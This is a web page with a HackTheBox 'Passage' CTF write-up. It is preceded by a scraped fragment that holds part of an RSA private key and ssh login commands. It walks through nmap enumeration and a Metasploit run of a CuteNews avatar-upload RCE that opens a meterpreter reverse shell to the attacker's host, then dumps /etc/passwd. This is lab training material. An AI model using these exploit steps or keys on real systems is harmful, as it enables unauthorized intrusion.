AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0 VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt 1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0 KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1 9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw== -----END RSA PRIVATE KEY----- 1 2 $ chmod 600 paul_rsa.key $ ssh paul@passage.htb -i paul_rsa.key Privilege Escalation of Machine : paul to nadav I ran linpeas but that was useless, you had to guess the key was re-used by nadav as well, which is not very realistic.\n1 $ ssh nadav@passage.htb -i paul_rsa.key Privilege Escalation of Machine : nadav to root 1 2 $ paul@passage:~$ groups nadav nadav : nadav adm cdrom sudo dip plugdev lpadmin sambashare It seems we will hack printers.\nThe first clue is that port 631 (Internet Printing Protocol(IPP)) is open on localhost.\n1 2 3 4 5 6 7 $ ss -nlpt State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:22 *:* LISTEN 0 5 127.0.0.1:631 *:* LISTEN 0 128 :::80 :::* LISTEN 0 128 :::22 :::* LISTEN 0 5 ::1:631 :::* A second clue is that nadav is in lpadmin group.\nA third clue if you list process:\n1 2 3 4 5 $ ps -ef f ... root 9774 1 0 07:35 ? Ss 0:00 /usr/sbin/cupsd -l lp 9779 9774 0 07:35 ? S 0:00 \\_ /usr/lib/cups/notifier/dbus dbus:// root 9775 1 0 07:35 ? Ssl 0:00 /usr/sbin/cups-browsed Let’s find CUPS version:\n1 2 3 4 5 6 7 8 9 $ apt policy cups cups: Installed: 2.1.3-4ubuntu0.7 Candidate: 2.1.3-4ubuntu0.7 Version table: *** 2.1.3-4ubuntu0.7 100 100 /var/lib/dpkg/status 2.1.3-4 500 500 http://us.archive.ubuntu.com/ubuntu xenial/main amd64 Packages But it seems it’s pretty much recent and patched. In fact CUPS was only a sneaky rabbit hole.\nWe can find some info about some files edited with vim in .viminfo.\n/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u003c!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\" \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e ","wordCount":"1695","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/passage/passage.png","datePublished":"2021-03-08T19:36:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/passage/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Passage</h1><div class=post-description>Passage HackTheBox writeup</div><div class=post-meta><span title='2021-03-08 19:36:00 +0000 UTC'>March 8, 2021</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1695 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/medium/ class=post-tag title=medium>medium</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/passage/passage.png alt="Passage HackTheBox Machine"><p>Passage - Medium Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-exploration>HTTP exploration</a></li><li><a href=#http-exploitation>HTTP exploitation</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#privilege-escalation-of-machine--from-www-data-to-paul>Privilege Escalation of Machine : from www-data to paul</a></li><li><a href=#waypoint>Waypoint</a></li><li><a href=#privilege-escalation-of-machine--paul-to-nadav>Privilege Escalation of Machine : paul to nadav</a></li><li><a href=#privilege-escalation-of-machine--nadav-to-root>Privilege Escalation of Machine : nadav to root</a></li><li><a href=#bonus>Bonus</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Passage</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/275>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap exploit-db metasploit ruby-ctf-party haiti john peass
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.80 scan initiated Mon Sep  7 14:40:30 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.129.8.231
</span></span><span class=line><span class=cl>Nmap scan report for 10.129.8.231
</span></span><span class=line><span class=cl>Host is up (0.027s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed ports
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
</span></span><span class=line><span class=cl>|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
</span></span><span class=line><span class=cl>|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span></span><span class=line><span class=cl>|_http-title: Passage News
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Mon Sep  7 14:40:57 2020 -- 1 IP address (1 host up) scanned in 26.35 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=http-exploration>HTTP exploration<a hidden class=anchor aria-hidden=true href=#http-exploration>#</a></h2><p>At the bottom of the main page we can read:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Powered by CuteNews
</span></span></code></pre></td></tr></table></div></div><p>With exploitdb we can search exploits for <code>CuteNews</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ searchsploit CuteNews
</span></span></code></pre></td></tr></table></div></div><p>One of the RSS post (http://10.129.8.231/index.php?do=rss&amp;id=11) is telling us
there is a Fail2Ban, so bruteforcing is useless.</p><blockquote><p>Due to unusually large amounts of traffic, we have implemented Fail2Ban on our website. Let it be known that excessive access to our server will be met with a two minute ban on your IP Address. While we do not wish to lock out our legitimate users, this decision is necessary in order to ensure a safe viewing experience. Please proceed with caution as you browse through our extensive news selection.</p></blockquote><p>By checking the source code repository (<a href=https://github.com/CuteNews/cutenews-2.0>https://github.com/CuteNews/cutenews-2.0</a>)
we can find some files or paths existing on the webserver without bruteforcing.</p><p>By consulting http://10.129.8.231/news.php we are redirected to <a href=http://passage.htb/CuteNews/rss.php>http://passage.htb/CuteNews/rss.php</a>,
so a domain is used for a virtual host. Let&rsquo;s add it to our hosts file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep pass
</span></span><span class=line><span class=cl>10.129.8.231 passage.htb
</span></span></code></pre></td></tr></table></div></div><h2 id=http-exploitation>HTTP exploitation<a hidden class=anchor aria-hidden=true href=#http-exploitation>#</a></h2><p>In <a href=https://www.exploit-db.com/exploits/46698>EDB 46698</a>, we see the login page
is <a href="http://passage.htb/CuteNews/index.php?mod=main&opt=personal">http://passage.htb/CuteNews/index.php?mod=main&opt=personal</a></p><p>This page leaks the exact version: <code>CuteNews 2.1.2</code>.</p><p>Let&rsquo;s register an account for the authenticated exploit: <a href=http://passage.htb/CuteNews/index.php?register>http://passage.htb/CuteNews/index.php?register</a></p><p>Then we can add the EDB exploit in msf:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cp /usr/share/exploitdb/exploits/php/remote/46698.rb .
</span></span><span class=line><span class=cl>$ nvim 46698.rb # Fix the comma
</span></span><span class=line><span class=cl>$ sudo cp 46698.rb /opt/metasploit/modules/exploits/unix/webapp/cutenews_avatar_rce.rb
</span></span><span class=line><span class=cl>$ sudo updatedb
</span></span></code></pre></td></tr></table></div></div><p>So now we are finally able to use the exploit & gain a shell access:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>msfconsole</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>use</span> <span class=n>exploit</span><span class=o>/</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>cutenews_avatar_rce</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>No</span> <span class=n>payload</span> <span class=n>configured</span><span class=p>,</span> <span class=n>defaulting</span> <span class=n>to</span> <span class=n>php</span><span class=o>/</span><span class=n>meterpreter</span><span class=o>/</span><span class=n>reverse_tcp</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>cutenews_avatar_rce</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>PASSWORD</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=n>PASSWORD</span> <span class=o>=&gt;</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>cutenews_avatar_rce</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>USERNAME</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=n>USERNAME</span> <span class=o>=&gt;</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>cutenews_avatar_rce</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>rHOSTS</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>8.231</span>
</span></span><span class=line><span class=cl><span class=n>rHOSTS</span> <span class=o>=&gt;</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>8.231</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>cutenews_avatar_rce</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>LHOST</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.157</span>
</span></span><span class=line><span class=cl><span class=n>LHOST</span> <span class=o>=&gt;</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.157</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>unix</span><span class=o>/</span><span class=n>webapp</span><span class=o>/</span><span class=n>cutenews_avatar_rce</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>run</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Started</span> <span class=n>reverse</span> <span class=n>TCP</span> <span class=n>handler</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.157</span><span class=p>:</span><span class=mi>4444</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.129</span><span class=o>.</span><span class=mf>8.231</span><span class=p>:</span><span class=mi>80</span> <span class=o>-</span> <span class=n>CuteNews</span> <span class=n>is</span> <span class=mf>2.1</span><span class=o>.</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Authentication</span> <span class=n>was</span> <span class=n>successful</span> <span class=n>with</span> <span class=n>user</span><span class=p>:</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Trying</span> <span class=n>to</span> <span class=n>upload</span> <span class=n>lgepbxvv</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Upload</span> <span class=n>successfully</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Sending</span> <span class=n>stage</span> <span class=p>(</span><span class=mi>38288</span> <span class=n>bytes</span><span class=p>)</span> <span class=n>to</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>8.231</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Meterpreter</span> <span class=n>session</span> <span class=mi>1</span> <span class=n>opened</span> <span class=p>(</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>14.157</span><span class=p>:</span><span class=mi>4444</span> <span class=o>-&gt;</span> <span class=mf>10.129</span><span class=o>.</span><span class=mf>8.231</span><span class=p>:</span><span class=mi>57094</span><span class=p>)</span> <span class=n>at</span> <span class=mi>2020</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>07</span> <span class=mi>15</span><span class=p>:</span><span class=mi>50</span><span class=p>:</span><span class=mi>18</span> <span class=o>+</span><span class=mi>0200</span>
</span></span><span class=line><span class=cl><span class=n>meterpreter</span> <span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>id</span>
</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>os</span><span class=o>-</span><span class=n>release</span>
</span></span><span class=line><span class=cl><span class=n>NAME</span><span class=o>=</span><span class=s2>&#34;Ubuntu&#34;</span>
</span></span><span class=line><span class=cl><span class=n>VERSION</span><span class=o>=</span><span class=s2>&#34;16.04.6 LTS (Xenial Xerus)&#34;</span>
</span></span><span class=line><span class=cl><span class=n>ID</span><span class=o>=</span><span class=n>ubuntu</span>
</span></span><span class=line><span class=cl><span class=n>ID_LIKE</span><span class=o>=</span><span class=n>debian</span>
</span></span><span class=line><span class=cl><span class=n>PRETTY_NAME</span><span class=o>=</span><span class=s2>&#34;Ubuntu 16.04.6 LTS&#34;</span>
</span></span><span class=line><span class=cl><span class=n>VERSION_ID</span><span class=o>=</span><span class=s2>&#34;16.04&#34;</span>
</span></span><span class=line><span class=cl><span class=n>HOME_URL</span><span class=o>=</span><span class=s2>&#34;http://www.ubuntu.com/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>SUPPORT_URL</span><span class=o>=</span><span class=s2>&#34;http://help.ubuntu.com/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>BUG_REPORT_URL</span><span class=o>=</span><span class=s2>&#34;http://bugs.launchpad.net/ubuntu/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>VERSION_CODENAME</span><span class=o>=</span><span class=n>xenial</span>
</span></span><span class=line><span class=cl><span class=n>UBUNTU_CODENAME</span><span class=o>=</span><span class=n>xenial</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span>
</span></span><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
